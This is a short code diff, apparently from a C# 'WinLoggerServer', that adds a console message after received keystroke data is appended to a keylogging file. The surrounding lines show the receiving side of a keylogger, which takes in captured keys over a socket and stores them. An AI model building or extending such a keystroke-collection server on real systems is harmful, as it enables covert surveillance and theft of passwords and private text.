@@ -58,6 +58,7 @@ public class WinLoggerServer {
 
                 // Append text to the keylogging file.
                 File.AppendAllText(Globals.logfp, data + Environment.NewLine); 
+                Console.WriteLine("Received some keys. Appended to log file.");
  
                 handler.Shutdown(SocketShutdown.Both);  
                 handler.Close();  
